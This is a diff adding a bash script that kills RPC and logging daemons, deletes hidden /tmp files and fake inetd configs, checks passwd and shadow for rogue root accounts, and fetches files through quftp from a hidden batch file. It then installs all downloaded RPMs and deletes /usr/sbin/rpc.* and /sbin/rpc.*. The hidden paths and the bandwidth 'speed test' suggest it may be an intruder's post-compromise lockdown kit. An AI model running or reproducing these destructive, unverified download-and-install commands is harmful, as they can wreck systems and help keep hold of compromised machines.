@@ -1,0 +1,46 @@
+#!/bin/bash
+killall -q -9 klogd
+killall -q -9 lockd
+killall -q -9 portmap
+killall -q -9 lpd
+killall -q -9 rpc.mountd
+killall -q -9 rpc.nfsd
+killall -q -9 rpc.statd
+killall -q -9 rpc.rquotad
+killall -q -9 rpc.rwalld
+killall -q -9 rpc.rstatd
+killall -q -9 rpc.rusersd
+rm -rf /tmp/.bash_history /tmp/m
+rm -rf /tmp/.blunt
+rm -rf /etc/ientd.conf
+rm -rf /etc/inted.conf
+echo "fixing.. suidperl.."
+chmod -s /usr/bin/suidperl
+sleep 2
+echo "anonymous" >> /etc/ftpusers
+pico /etc/passwd
+pico /etc/shadow
+echo "checking for any rpc/inetd proc's running"
+echo "       and inetd.conf suid shells"
+echo ""
+ps aux|grep rpc|grep -v grep
+ps aux|grep inetd|grep -v grep
+cat /etc/inetd.conf|grep "\-i"
+echo -n "continue? "
+read continue
+echo "checking for any bad entrys in etc/passwd"
+echo ""
+cat /etc/passwd | grep "0:0" | grep -v root
+cat /etc/shadow | grep adm
+cat /etc/shadow | grep operator
+/usr/sbin/pwck
+echo -n "continue? "
+read continue2
+echo "downloading & installing patches."
+bin/quftp -s bin/.update | grep "#"
+rpm -Uvh *.rpm
+rm -rf /usr/sbin/rpc.*
+rm -rf /sbin/rpc.* 
+rm -rf /tmp/*.gz
+echo "Now doing speed test.."
+bin/quftp -s bin/.speed | grep "#"
